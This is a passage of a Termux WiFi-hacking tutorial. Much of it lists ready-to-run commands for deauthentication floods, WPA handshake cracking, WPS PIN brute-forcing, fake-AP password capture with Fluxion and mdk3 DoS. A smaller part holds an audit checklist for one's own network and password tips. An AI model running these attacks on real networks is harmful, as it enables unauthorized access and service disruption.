│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  Step 4: Crack Handshake                                                 │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ aircrack-ng -w wordlist.txt capture-01.cap                      │   │
│  │                                                                  │   │
│  │ Wordlists:                                                       │   │
│  │ - rockyou.txt (14M passwords)                                   │   │
│  │ - darkc0de.lst                                                  │   │
│  │ - Custom wordlist                                               │   │
│  │                                                                  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  Success: KEY FOUND! [ password123 ]                                    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 6. Hardware Setup Guide

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    EXTERNAL WIFI ADAPTER SETUP                           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  REQUIRED HARDWARE                                                       │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                  │   │
│  │  1. USB OTG Adapter                                              │   │
│  │     • USB-C to USB-A (newer phones)                             │   │
│  │     • Micro-USB to USB-A (older phones)                         │   │
│  │     • Check phone for OTG support                               │   │
│  │                                                                  │   │
│  │  2. WiFi Adapter with Monitor Mode Support                      │   │
│  │     • Alfa AWUS036NHA (Recommended)                             │   │
│  │     • TP-Link TL-WN722N v1                                      │   │
│  │     • Panda PAU05                                                │   │
│  │                                                                  │   │
│  │  3. Optional: Powered USB Hub                                    │   │
│  │     • For stable power delivery                                 │   │
│  │     • WiFi adapters need 500mA+                                 │   │
│  │                                                                  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  CONNECTION DIAGRAM                                                      │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                  │   │
│  │  Basic Setup:                                                    │   │
│  │  ┌───────┐     ┌─────┐     ┌──────────┐                         │   │
│  │  │ Phone │────►│ OTG │────►│  WiFi    │                         │   │
│  │  │USB-C  │     │     │     │ Adapter  │                         │   │
│  │  └───────┘     └─────┘     └──────────┘                         │   │
│  │                                                                  │   │
│  │  With Powered Hub:                                               │   │
│  │  ┌───────┐     ┌─────┐     ┌──────┐     ┌──────────┐           │   │
│  │  │ Phone │────►│ OTG │────►│ USB  │────►│  WiFi    │           │   │
│  │  │USB-C  │     │     │     │ Hub  │     │ Adapter  │           │   │
│  │  └───────┘     └─────┘     │with  │     └──────────┘           │   │
│  │                            │Power │                              │   │
│  │                            │Input │                              │   │
│  │                            └──┬───┘                              │   │
│  │                               │                                  │   │
│  │                          ┌────▼────┐                             │   │
│  │                          │ Power   │                             │   │
│  │                          │ Bank /  │                             │   │
│  │                          │ Adapter │                             │   │
│  │                          └─────────┘                             │   │
│  │                                                                  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  VERIFICATION COMMANDS                                                   │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ lsusb                    # List USB devices                     │   │
│  │ dmesg | grep -i wifi     # Check WiFi device detection          │   │
│  │ iwconfig                 # Show wireless interfaces             │   │
│  │ ifconfig                 # Show all interfaces                  │   │
│  │ iw dev                   # Show wireless device info            │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 COMMANDS REFERENCE

### Aircrack-ng Suite Commands

```bash
═══════════════════════════════════════════════════════════════════════════
AIRCRACK-NG SUITE - COMPLETE COMMAND REFERENCE
═══════════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────────────┐
│ AIRMON-NG - Monitor Mode Management                                      │
├─────────────────────────────────────────────────────────────────────────┤
│ airmon-ng                              # Show status                    │
│ airmon-ng start wlan0                  # Enable monitor mode            │
│ airmon-ng stop wlan0mon                # Disable monitor mode           │
│ airmon-ng check                        # Check interfering processes    │
│ airmon-ng check kill                   # Kill interfering processes     │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ AIRODUMP-NG - Packet Capture & Network Scanning                          │
├─────────────────────────────────────────────────────────────────────────┤
│ airodump-ng wlan0mon                   # Scan all networks              │
│ airodump-ng -c 6 wlan0mon              # Scan specific channel          │
│ airodump-ng --band a wlan0mon          # Scan 5GHz only                 │
│ airodump-ng --band bg wlan0mon         # Scan 2.4GHz only               │
│ airodump-ng --band abg wlan0mon        # Scan all bands                 │
│ airodump-ng -w capture wlan0mon        # Save capture to file           │
│ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon                     │
│                                         # Target specific network        │
│ airodump-ng -c 6 --bssid XX -w output wlan0mon                          │
│                                         # Target and save                │
│ airodump-ng --encrypt wpa2 wlan0mon    # Show only WPA2 networks        │
│ airodump-ng --essid "MyWiFi" wlan0mon  # Target by name                 │
│ airodump-ng -c 1-13 wlan0mon           # Scan channels 1-13             │
│ airodump-ng --output-format pcap wlan0mon                               │
│                                         # Output format                  │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ AIREPLAY-NG - Packet Injection                                           │
├─────────────────────────────────────────────────────────────────────────┤
│ # Deauthentication attacks                                               │
│ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon                          │
│                                        # Send 5 deauth packets          │
│ aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon                          │
│                                        # Continuous deauth              │
│ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan0mon     │
│                                        # Target specific client         │
│ aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon                   │
│                                        # Alternative syntax             │
│                                                                          │
│ # Fake authentication                                                    │
│ aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon              │
│                                        # Associate with AP              │
│ aireplay-ng -1 60 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon             │
│                                        # Associate with timeout         │
│                                                                          │
│ # ARP Replay (WEP attacks)                                               │
│ aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon                            │
│                                        # ARP replay attack              │
│ aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF wlan0mon                   │
│                                        # Alternative syntax             │
│                                                                          │
│ # Chopchop attack (WEP)                                                  │
│ aireplay-ng -4 -b AA:BB:CC:DD:EE:FF wlan0mon                            │
│                                                                          │
│ # Fragmentation attack (WEP)                                             │
│ aireplay-ng -5 -b AA:BB:CC:DD:EE:FF wlan0mon                            │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ AIRCRACK-NG - Password Cracking                                          │
├─────────────────────────────────────────────────────────────────────────┤
│ aircrack-ng capture-01.cap              # Basic crack                   │
│ aircrack-ng -w wordlist.txt capture-01.cap                              │
│                                         # Dictionary attack             │
│ aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap          │
│                                         # Target specific BSSID         │
│ aircrack-ng -w wordlist.txt -e "MyWiFi" capture-01.cap                  │
│                                         # Target by ESSID               │
│ aircrack-ng -w wordlist.txt -q capture-01.cap                           │
│                                         # Quiet mode                    │
│ aircrack-ng -w wordlist.txt -S capture-01.cap                           │
│                                         # Single session                │
│ aircrack-ng -r db capture-01.cap        # Use airolib database          │
│ aircrack-ng -x capture-01.cap           # Enable brute force            │
│ aircrack-ng -X capture-01.cap           # Disable brute force           │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ AIRDECAP-NG - Decryption                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ airdecap-ng -w password capture.cap    # Decrypt with password          │
│ airdecap-ng -e "MyWiFi" -p password capture.cap                         │
│                                        # Decrypt specific network        │
│ airdecap-ng -b AA:BB:CC:DD:EE:FF -w password capture.cap                │
│                                        # Decrypt specific BSSID          │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ AIROLIB-NG - PMK Database Management                                     │
├─────────────────────────────────────────────────────────────────────────┤
│ airolib-ng database init               # Create database                │
│ airolib-ng database import essid essid.txt                              │
│                                         # Import ESSIDs                 │
│ airolib-ng database import passwd wordlist.txt                          │
│                                         # Import passwords              │
│ airolib-ng database clean all          # Clean database                │
│ airolib-ng database stats              # Show statistics               │
│ airolib-ng database batch              # Start batch processing        │
│ airolib-ng database verify all         # Verify database               │
└─────────────────────────────────────────────────────────────────────────┘
```

### WPS Attack Commands

```bash
═══════════════════════════════════════════════════════════════════════════
WPS ATTACK TOOLS - REAVER & BULLY
═══════════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────────────┐
│ WASH - WPS Network Scanner                                               │
├─────────────────────────────────────────────────────────────────────────┤
│ wash -i wlan0mon                        # Scan WPS networks             │
│ wash -i wlan0mon -c 6                   # Scan specific channel        │
│ wash -i wlan0mon -C                     # Ignore checksum errors       │
│ wash -i wlan0mon -o output.txt          # Save to file                 │
│ wash -i wlan0mon -s                     # Silent mode                  │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ REAVER - WPS PIN Cracker                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF # Basic WPS attack             │
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv                             │
│                                         # Very verbose                  │
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6                            │
│                                         # Specific channel              │
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -S                              │
│                                         # Small DH keys (faster)        │
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5                            │
│                                         # Delay 5 seconds               │
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -T 0.5                          │
│                                         # Receive timeout               │
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -a                              │
│                                         # Pseudo random MAC             │
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670                     │
│                                         # Try specific PIN             │
│ reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -s session                      │
│                                         # Save/restore session         │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ BULLY - Alternative WPS Cracker                                          │
├─────────────────────────────────────────────────────────────────────────┤
│ bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon # Basic attack                 │
│ bully -b AA:BB:CC:DD:EE:FF wlan0mon      # Auto channel                │
│ bully -b AA:BB:CC:DD:EE:FF -c 6 -v 3 wlan0mon                           │
│                                          # Verbose level 3              │
│ bully -b AA:BB:CC:DD:EE:FF -c 6 -d 3 wlan0mon                           │
│                                          # Delay 3 seconds              │
│ bully -b AA:BB:CC:DD:EE:FF -c 6 -S wlan0mon                             │
│                                          # Start from start             │
│ bully -b AA:BB:CC:DD:EE:FF -c 6 -L wlan0mon                             │
│                                          # Lock delay bypass            │
└─────────────────────────────────────────────────────────────────────────┘
```

### Network Interface Commands

```bash
═══════════════════════════════════════════════════════════════════════════
NETWORK INTERFACE MANAGEMENT
═══════════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────────────┐
│ INTERFACE STATUS                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│ ifconfig                                # Show all interfaces           │
│ ifconfig wlan0                          # Show specific interface       │
│ iwconfig                                # Show wireless interfaces      │
│ iw dev                                  # Show wireless devices         │
│ iw list                                 # Show device capabilities      │
│ ip link show                            # Show all links                │
│ ip addr show                            # Show addresses                │
│ ls /sys/class/net/                      # List network interfaces       │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ INTERFACE CONTROL                                                        │
├─────────────────────────────────────────────────────────────────────────┤
│ ifconfig wlan0 up                       # Enable interface              │
│ ifconfig wlan0 down                     # Disable interface             │
│ ip link set wlan0 up                    # Enable (ip command)           │
│ ip link set wlan0 down                  # Disable (ip command)          │
│ iwconfig wlan0 mode monitor             # Set monitor mode              │
│ iwconfig wlan0 mode managed             # Set managed mode              │
│ iwconfig wlan0 channel 6                # Set channel                   │
│ iw wlan0 set type monitor               # Set monitor (iw)              │
│ iw wlan0 set type managed               # Set managed (iw)              │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ MANAGING MONITOR MODE MANUALLY                                           │
├─────────────────────────────────────────────────────────────────────────┤
│ # Kill interfering processes                                             │
│ killall NetworkManager                                                 │
│ killall wpa_supplicant                                                 │
│ systemctl stop NetworkManager    # If systemd                          │
│                                                                         │
│ # Manual monitor mode setup                                              │
│ ifconfig wlan0 down                                                     │
│ iwconfig wlan0 mode monitor                                            │
│ ifconfig wlan0 up                                                       │
│ iwconfig wlan0                                                         │
│                                                                         │
│ # Manual managed mode restore                                            │
│ ifconfig wlan0 down                                                     │
│ iwconfig wlan0 mode managed                                            │
│ ifconfig wlan0 up                                                       │
└─────────────────────────────────────────────────────────────────────────┘
```

### Additional WiFi Tools

```bash
═══════════════════════════════════════════════════════════════════════════
ADDITIONAL WIFI SECURITY TOOLS
═══════════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────────────┐
│ WIFITE - Automated WiFi Attack Tool                                      │
├─────────────────────────────────────────────────────────────────────────┤
│ wifite                                  # Launch wifite                 │
│ wifite --kill                           # Kill interfering processes    │
│ wifite --channel 6                      # Target specific channel       │
│ wifite --encrypt wpa                    # Only WPA networks             │
│ wifite --wps                            # Only WPS-enabled              │
│ wifite --dict wordlist.txt              # Specify wordlist              │
│ wifite --pow 50                         # Min power filter              │
│ wifite --random                         # Random MAC address            │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ FLUXION - Social Engineering WiFi Attack                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ git clone https://github.com/FluxionNetwork/fluxion                     │
│ cd fluxion                                                              │
│ ./fluxion.sh                            # Launch fluxion                │
│                                                                         │
│ # Creates fake AP, captures password                                    │
│ # Works via captive portal                                              │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ MDK3/MDK4 - WiFi DoS Tools                                               │
├─────────────────────────────────────────────────────────────────────────┤
│ mdk3 wlan0mon d -c 6                    # Deauth on channel 6           │
│ mdk3 wlan0mon d -c 6 -B AA:BB:CC:DD:EE:FF                              │
│                                         # Target specific BSSID         │
│ mdk3 wlan0mon a -a AA:BB:CC:DD:EE:FF    # Authentication DoS           │
│ mdk3 wlan0mon b -c 6                    # Beacon flood                  │
│ mdk3 wlan0mon m -c 6                    # Michael shutdown              │
│                                                                         │
│ # MDK4 (newer version)                                                   │
│ mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF    # Deauth attack                │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ HOSTAPD - Create Access Point                                            │
├─────────────────────────────────────────────────────────────────────────┤
│ hostapd hostapd.conf                    # Start AP with config          │
│                                                                         │
│ # Basic config file:                                                     │
│ cat > hostapd.conf << 'EOF'                                            │
│ interface=wlan0                                                         │
│ driver=nl80211                                                          │
│ ssid=FakeAP                                                             │
│ channel=6                                                               │
│ EOF                                                                     │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ HASHCAT - GPU Cracking (for captured handshakes)                         │
├─────────────────────────────────────────────────────────────────────────┤
│ # Convert cap to hccapx                                                  │
│ aircrack-ng -J output capture.cap      # Old format                    │
│ cap2hccapx.bin capture.cap output.hccapx # New format                  │
│                                                                         │
│ # Hashcat cracking                                                       │
│ hashcat -m 2500 capture.hccapx wordlist.txt                            │
│ hashcat -m 2500 capture.hccapx wordlist.txt --force                    │
│ hashcat -m 22000 capture.hc22000 wordlist.txt  # WPA-PBKDF2-PMKID+EAPOL│
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ HCXTOOLS - Modern WiFi Tools                                             │
├─────────────────────────────────────────────────────────────────────────┤
│ hcxdumptool -i wlan0mon -o dump.pcapng  # Capture packets               │
│ hcxpcapngtool -o hash.hc22000 dump.pcapng # Convert to hash            │
│ hcxhashtool -i hash.hc22000 --info      # Hash info                     │
└─────────────────────────────────────────────────────────────────────────┘
```

### No-Root WiFi Analysis Commands

```bash
═══════════════════════════════════════════════════════════════════════════
NO-ROOT WIFI ANALYSIS TOOLS
═══════════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────────────┐
│ NETWORK INFORMATION (No Root Required)                                   │
├─────────────────────────────────────────────────────────────────────────┤
│ # Using Termux-API (requires Termux:API app)                             │
│ termux-wifi-connectioninfo              # Current connection info       │
│ termux-wifi-enable                      # Enable WiFi                   │
│ termux-wifi-disable                     # Disable WiFi                  │
│ termux-wifi-scaninfo                    # Scan networks                 │
│                                                                         │
│ # Basic network info                                                     │
│ ping -c 3 192.168.1.1                   # Check router connectivity     │
│ netstat -rn                             # Show routing table            │
│ arp -a                                  # Show ARP table                │
│                                                                         │
│ # DNS information                                                        │
│ nslookup google.com                     # DNS lookup                    │
│ dig google.com                          # Detailed DNS info             │
│                                                                         │
│ # Network scanning (nmap)                                                │
│ nmap -sn 192.168.1.0/24                 # Ping scan network             │
│ nmap -sS 192.168.1.1                    # TCP SYN scan                  │
│ nmap -sV 192.168.1.1                    # Version detection             │
│ nmap -O 192.168.1.1                     # OS detection                  │
│                                                                         │
│ # Port scanning                                                          │
│ nc -zv 192.168.1.1 1-1000               # Scan ports 1-1000             │
│                                                                         │
│ # HTTP analysis                                                          │
│ curl -I http://192.168.1.1              # HTTP headers                  │
│ wget --spider http://192.168.1.1        # Check HTTP server             │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ PASSWORD GENERATION (For Securing WiFi)                                  │
├─────────────────────────────────────────────────────────────────────────┤
│ # Generate strong passwords                                              │
│ openssl rand -base64 12                  # Random password              │
│ openssl rand -hex 16                     # Hex random                   │
│                                                                         │
│ # Python random password                                                 │
│ python -c "import secrets; print(secrets.token_urlsafe(16))"           │
│                                                                         │
│ # Custom password generator                                              │
│ python << 'EOF'                                                         │
│ import string                                                            │
│ import secrets                                                           │
│ alphabet = string.ascii_letters + string.digits + string.punctuation   │
│ password = ''.join(secrets.choice(alphabet) for _ in range(16))         │
│ print(password)                                                          │
│ EOF                                                                     │
│                                                                         │
│ # pwgen tool                                                             │
│ pkg install pwgen                                                       │
│ pwgen 16 5                              # Generate 5 passwords of 16 chars│
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 💻 PRACTICE EXERCISES

### Exercise 1: Installation & Verification

```bash
# Task: Install aircrack-ng suite and verify installation

# Step 1: Update Termux
pkg update && pkg upgrade -y

# Step 2: Enable root repository
pkg install root-repo -y

# Step 3: Install aircrack-ng
pkg install aircrack-ng -y

# Step 4: Verify installation
aircrack-ng --version
airmon-ng --help
airodump-ng --help

# Step 5: Install additional tools
pkg install wireless-tools iw

# Step 6: Check available tools
which airmon-ng
which airodump-ng
which aireplay-ng
which aircrack-ng

# Expected: All tools should be found in /data/data/com.termux/files/usr/bin/
```

### Exercise 2: Interface Analysis

```bash
# Task: Analyze wireless interfaces (No external adapter needed for this)

# Step 1: List network interfaces
ls /sys/class/net/

# Step 2: Check ifconfig
ifconfig

# Step 3: Check iwconfig
iwconfig

# Step 4: Check wireless capabilities
iw list 2>/dev/null || echo "iw not available or no wireless extensions"

# Step 5: Check current connection (using Termux API)
pkg install termux-api
termux-wifi-connectioninfo

# Step 6: Scan available networks
termux-wifi-scaninfo

# Step 7: Document your findings
echo "Interface Name: $(iwconfig 2>&1 | grep -o '^[a-z]*[0-9]')"
echo "Current Network: $(termux-wifi-connectioninfo | grep -o '\"ssid\":\"[^\"]*\"')"
```

### Exercise 3: Network Scanning (Your Own Network)

```bash
# Task: Scan your own network for connected devices

# Step 1: Get your network info
MY_IP=$(ifconfig wlan0 2>/dev/null | grep "inet " | awk '{print $2}')
echo "My IP: $MY_IP"

# Step 2: Install nmap
pkg install nmap -y

# Step 3: Scan your network (replace with your network range)
# Example: 192.168.1.0/24
nmap -sn 192.168.1.0/24

# Step 4: Save results
nmap -sn 192.168.1.0/24 -oN network_scan.txt

# Step 5: Scan router for open ports
ROUTER_IP=$(ip route | grep default | awk '{print $3}')
echo "Router IP: $ROUTER_IP"
nmap -sV $ROUTER_IP

# Step 6: Check for WiFi password strength
# Generate a test to see how long your password would take to crack
# (This is educational - understand that weak passwords are vulnerable)
```

### Exercise 4: Handshake Capture Simulation

```bash
# Task: Understand the handshake capture workflow
# Note: This requires external WiFi adapter and root

# This is a SIMULATION exercise to understand the commands

# Step 1: List the steps
cat << 'EOF'
═══════════════════════════════════════════════════════════════
HANDSHAKE CAPTURE WORKFLOW
═══════════════════════════════════════════════════════════════

1. Connect external WiFi adapter via OTG

2. Check if adapter is detected:
   lsusb
   iwconfig

3. Kill interfering processes:
   airmon-ng check kill

4. Enable monitor mode:
   airmon-ng start wlan1

5. Scan networks:
   airodump-ng wlan1mon

6. Target specific network:
   airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan1mon

7. Capture handshake (wait or force):
   # Passive: Wait for client to connect
   # Active: aireplay-ng -0 5 -a TARGET_BSSID wlan1mon

8. Crack the handshake:
   aircrack-ng -w wordlist.txt capture-01.cap

═══════════════════════════════════════════════════════════════
EOF

# Step 2: Practice with your own network (with permission)
# Document BSSID, Channel, Encryption type

# Step 3: Create a wordlist for testing
cat > test_wordlist.txt << 'EOF'
password
password123
password1234
12345678
qwerty123
letmein
welcome
admin
123456789
password1
EOF

# Step 4: Understand the capture file format
# .cap files contain packet data
# Can be analyzed with: tcpdump, wireshark, aircrack-ng
```

### Exercise 5: WiFi Security Audit

```bash
# Task: Audit your own WiFi network security

# Step 1: Create audit checklist
cat << 'EOF' > wifi_audit.txt
═══════════════════════════════════════════════════════════════
WIFI SECURITY AUDIT CHECKLIST
═══════════════════════════════════════════════════════════════

Network Name (SSID): ________________

[ ] 1. ENCRYPTION CHECK
    Current Encryption: ____________
    □ WPA3 (Best)
    □ WPA2-AES (Good)
    □ WPA-TKIP (Weak)
    □ WEP (Critical - Change Immediately!)

[ ] 2. PASSWORD STRENGTH
    Password Length: ______ characters
    □ 16+ (Excellent)
    □ 12-15 (Good)
    □ 8-11 (Fair)
    □ <8 (Weak)
    
    Contains:
    □ Uppercase letters
    □ Lowercase letters
    □ Numbers
    □ Special characters
    
    Password in common wordlist? □ Yes □ No

[ ] 3. WPS STATUS
    WPS Enabled: □ Yes □ No
    If Yes: DISABLE IMMEDIATELY

[ ] 4. ROUTER ADMIN
    Default Admin Password Changed: □ Yes □ No
    Remote Admin Enabled: □ Yes □ No
    If Remote Admin is Yes: Disable if not needed

[ ] 5. NETWORK CONFIGURATION
    SSID Broadcast: □ Visible □ Hidden
    Guest Network: □ Enabled □ Disabled
    MAC Filtering: □ Enabled □ Disabled

[ ] 6. FIRMWARE
    Router Model: ________________
    Firmware Version: ________________
    Last Updated: ________________

[ ] 7. CONNECTED DEVICES
    Number of known devices: ______
    Number of currently connected: ______
    Any unknown devices? □ Yes □ No

═══════════════════════════════════════════════════════════════
EOF

# Step 2: Fill the checklist
nano wifi_audit.txt

# Step 3: Generate recommendations based on findings
cat << 'EOF'
═══════════════════════════════════════════════════════════════
SECURITY RECOMMENDATIONS
═══════════════════════════════════════════════════════════════

1. If using WEP or WPA-TKIP:
   → Upgrade to WPA2-AES or WPA3 immediately

2. If WPS is enabled:
   → Disable WPS in router settings

3. If using default admin password:
   → Change to strong unique password

4. If password < 12 characters:
   → Generate new strong password:
   openssl rand -base64 16

5. If firmware is outdated:
   → Check manufacturer website for updates

6. If unknown devices connected:
   → Change WiFi password immediately
   → Enable MAC filtering as additional measure

7. For maximum security:
   → Use separate guest network
   → Enable router firewall
   → Disable remote management
   → Regular password changes (every 3-6 months)

═══════════════════════════════════════════════════════════════
EOF
```

### Exercise 6: Wordlist Creation

```bash
# Task: Create custom wordlist for testing

# Step 1: Download rockyou wordlist
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz -O rockyou.tar.gz

# Step 2: Extract
tar -xzf rockyou.tar.gz

# Step 3: Check size
wc -l rockyou.txt

# Step 4: Create custom wordlist
cat > custom_wordlist.txt << 'EOF'
password
12345678
qwerty
letmein
welcome
admin
password123
Password1!
MyWiFi2020
MyWiFi2021
MyWiFi2022
MyWiFi2023
MyWiFi2024
John1234
Mike1234
Family123
Home12345
EOF

# Step 5: Generate variations using crunch
pkg install crunch -y

# Generate 8-character numeric passwords
crunch 8 8 0123456789 -o numeric_8.txt

# Generate passwords with pattern
crunch 10 10 -t Password@@ -o password_variations.txt

# Step 6: Merge and deduplicate
cat rockyou.txt custom_wordlist.txt | sort -u > merged_wordlist.txt
echo "Total passwords: $(wc -l merged_wordlist.txt)"
```

---

## ⚠️ TROUBLESHOOTING

### Problem 1: "aircrack-ng: command not found"

```bash
# Cause: Package not installed or not in PATH

# Solution 1: Install aircrack-ng
pkg update && pkg upgrade -y
pkg install aircack-ng -y

# Solution 2: Check if installed
pkg list-installed | grep aircrack

# Solution 3: Check PATH
echo $PATH
which aircrack-ng

# Solution 4: Reinstall
pkg uninstall aircrack-ng
pkg install aircrack-ng -y
```

### Problem 2: "Monitor mode not supported"

```bash
# Cause: Internal WiFi doesn't support monitor mode on Android

# Explanation:
# Android's internal WiFi firmware is restricted
# Monitor mode requires special firmware/drivers

# Solution: Use external USB WiFi adapter
# Supported adapters:
# - Alfa AWUS036NHA (Atheros AR9271)
# - TP-Link TL-WN722N v1 (Atheros AR9271)
# - Panda PAU05 (Ralink RT3070)

# Verify adapter detection:
lsusb
iwconfig
```

### Problem 3: "No such device" or "wlan0mon not found"

```bash
# Cause: WiFi adapter not detected or interface name different

# Solution 1: Check interface names
iwconfig
ifconfig -a
ls /sys/class/net/

# Solution 2: Check USB device
lsusb

# Solution 3: Load driver (if needed)
# Some adapters need specific drivers
# Check dmesg for driver issues:
dmesg | tail -50

# Solution 4: Use correct interface name
# It might be wlan1, wlan2, etc., not wlan0
airmon-ng start wlan1
```

### Problem 4: "Operation not permitted"

```bash
# Cause: ROOT access required

# Explanation:
# Monitor mode and packet injection require root
# Termux needs root access for these operations

# Solution 1: Check if rooted
su
# If root shell opens, you have root

# Solution 2: Grant Termux root access
# Use Magisk or SuperSU to grant root to Termux

# Solution 3: Use tsu (Termux su wrapper)
pkg install tsu
tsu
# Then run your commands

# Solution 4: Alternative without root
# Use WiFi Pineapple or similar hardware
```

### Problem 5: "Handshake not captured"

```bash
# Cause: Multiple possible reasons

# Reason 1: No client connected/connecting
# Solution: Wait for client or force deauth

# Reason 2: Weak signal
# Solution: Move closer to AP

# Reason 3: Wrong channel
# Solution: Verify channel and specify it
airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon

# Reason 4: Deauth not working
# Solution: Try multiple deauth packets
aireplay-ng -0 10 -a BSSID wlan0mon

# Reason 5: 5GHz network (if adapter doesn't support)
# Solution: Check if your adapter supports 5GHz
iw list | grep -A 10 "Frequencies:"

# Debug commands:
# Check if any handshake captured
aircrack-ng capture-01.cap

# View capture with tcpdump
tcpdump -r capture-01.cap -n
```

### Problem 6: "Dictionary attack not working"

```bash
# Cause: Wordlist doesn't contain password or capture issue

# Solution 1: Try different wordlists
aircrack-ng -w rockyou.txt capture-01.cap
aircrack-ng -w darkc0de.txt capture-01.cap

# Solution 2: Use combined wordlist
cat wordlist1.txt wordlist2.txt > combined.txt
aircrack-ng -w combined.txt capture-01.cap

# Solution 3: Verify capture has handshake
aircrack-ng capture-01.cap
# Should show "1 handshake" or similar

# Solution 4: Use hashcat for GPU acceleration
# Convert cap to hashcat format
aircrack-ng -J hash capture-01.cap
hashcat -m 2500 hash.hccapx wordlist.txt

# Solution 5: Try brute-force (very slow)
aircrack-ng capture-01.cap
# This tries all possible passwords
```

### Problem 7: External Adapter Not Detected

```bash
# Cause: Driver issues or OTG not working

# Solution 1: Check OTG support
# Download "USB OTG Checker" from Play Store

# Solution 2: Check USB device list
lsusb
# Should show your WiFi adapter

# Solution 3: Check kernel messages
dmesg | grep -i usb
dmesg | grep -i wifi

# Solution 4: Load driver manually
# For RTL8812AU:
modprobe 8812au

# For Atheros:
modprobe ath9k_htc

# Solution 5: Check power issues
# Use powered USB hub
# WiFi adapters need significant power

# Solution 6: Reboot with adapter connected
# Sometimes helps with driver loading
```

### Problem 8: "Network is unreachable"

```bash
# Cause: Interface in monitor mode (normal)

# Explanation:
# In monitor mode, you cannot access the internet
# Monitor mode is for capturing, not connecting

# Solution: Disable monitor mode when done
airmon-ng stop wlan0mon
# Or manually:
ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up

# Restart network services
systemctl restart NetworkManager  # If available
# Or reconnect to WiFi from Android settings
```

### Problem 9: Termux Crashes with WiFi Tools

```bash
# Cause: Resource intensive operations or bugs

# Solution 1: Close other apps
# Free up memory

# Solution 2: Increase Termux priority
# Settings → Battery → Unrestricted for Termux

# Solution 3: Check OOM killer
dmesg | grep -i "killed process"

# Solution 4: Use smaller wordlists
head -100000 rockyou.txt > small_wordlist.txt

# Solution 5: Split large operations
# Instead of one large capture, do multiple smaller ones

# Solution 6: Check storage
df -h
# Make sure you have free space
```

### Problem 10: WPS Attack Not Working

```bash
# Cause: WPS locked or not enabled on router

# Solution 1: Check if WPS is enabled
wash -i wlan0mon

# Solution 2: Check for WPS lock
# If "Locked" shows in wash output, WPS is locked
# Wait 5-30 minutes for lock to reset

# Solution 3: Try bully instead of reaver
bully -b BSSID -c CHANNEL wlan0mon

